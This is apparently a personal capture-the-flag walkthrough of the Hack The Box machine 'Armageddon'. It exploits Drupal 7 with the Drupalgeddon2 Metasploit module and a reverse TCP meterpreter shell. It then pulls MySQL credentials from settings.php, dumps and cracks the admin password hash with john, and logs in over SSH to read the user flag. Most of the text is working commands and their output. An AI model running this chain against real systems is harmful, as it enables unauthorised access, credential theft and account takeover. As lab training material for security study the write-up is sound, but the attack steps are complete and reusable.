# Enumeration-

![[Pasted image 20210703034334.png]]

Quickly searched for drupal 7 exploit on google-

![[Pasted image 20210703041210.png]]

[Drupal Drupalgeddon 2 Forms API Property Injection](https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2/)


# Exploit-

Its a metasploit exploit so lets launch msfconsole-

```bash
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > show options 

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.29.16    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)


msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 10.10.10.233
RHOSTS => 10.10.10.233
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set LHOST tun0
LHOST => tun0
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > exploit 

[*] Started reverse TCP handler on 10.10.15.4:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable.
[*] Sending stage (39282 bytes) to 10.10.10.233
[*] Meterpreter session 1 opened (10.10.15.4:4444 -> 10.10.10.233:43024) at 2021-07-03 04:19:32 -0400


meterpreter > 
```

I found an interesting file called `settings.php` inside `/var/www/html/sites/default/` directory. which has contain `mysql` creads-

```bash
meterpreter > ls
Listing: /var/www/html/sites/default
====================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  26250  fil   2017-06-21 14:20:18 -0400  default.settings.php
40775/rwxrwxr-x   37     dir   2020-12-03 07:32:39 -0500  files
100444/r--r--r--  26565  fil   2020-12-03 07:32:37 -0500  settings.php
```

### settings.php-
```bash
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj', 
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

User-drupaluser
Pass-CQHEy@9M*m23gBVj


### Mysql Database Enumeration-

```bash
meterpreter > shell
Process 8710 created.
Channel 0 created.
id
uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'
Database
information_schema
drupal
mysql
performance_schema
mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'show tables;'
<SNIP>
system
taxonomy_index
taxonomy_term_data
taxonomy_term_hierarchy
taxonomy_vocabulary
url_alias
users
users_roles
<SNIP>
mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'select name,pass from users;'
name    pass

brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
```

Trying to crack the hash with john-

```bash
root@napster:~/Documents/HTB/Armageddon# john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
booboo           (?)
1g 0:00:00:01 DONE (2021-07-03 05:00) 0.6060g/s 140.6p/s 140.6c/s 140.6C/s tiffany..harley
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

User-brucetherealadmin
Pass-booboo

# SSH-

```bash
root@napster:~/Documents/HTB/Armageddon# ssh brucetherealadmin@10.10.10.233
The authenticity of host '10.10.10.233 (10.10.10.233)' can't be established.
ECDSA key fingerprint is SHA256:bC1R/FE5sI72ndY92lFyZQt4g1VJoSNKOeAkuuRr4Ao.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.233' (ECDSA) to the list of known hosts.
brucetherealadmin@10.10.10.233's password: 
Last login: Sat Jul  3 09:45:24 2021 from 10.10.14.150
[brucetherealadmin@armageddon ~]$ ls -la
total 24
drwx------. 2 brucetherealadmin brucetherealadmin  134 Jul  3 09:55 .
drwxr-xr-x. 3 root              root                31 Dec  3  2020 ..
lrwxrwxrwx. 1 root              root                 9 Dec 11  2020 .bash_history -> /dev/null
-rw-r--r--. 1 brucetherealadmin brucetherealadmin   18 Apr  1  2020 .bash_logout
-rw-r--r--. 1 brucetherealadmin brucetherealadmin  193 Apr  1  2020 .bash_profile
-rw-r--r--. 1 brucetherealadmin brucetherealadmin  231 Apr  1  2020 .bashrc
-rw-rw-r--. 1 brucetherealadmin brucetherealadmin   73 Jul  3 09:55 crontab2.py
-r--------. 1 brucetherealadmin brucetherealadmin   33 Jul  3 02:36 user.txt
-rw-------. 1 brucetherealadmin brucetherealadmin 1077 Jul  3 09:55 .viminfo
[brucetherealadmin@armageddon ~]$ cat user.txt 
663e8dab475f8f08a0564c9c9e878906
``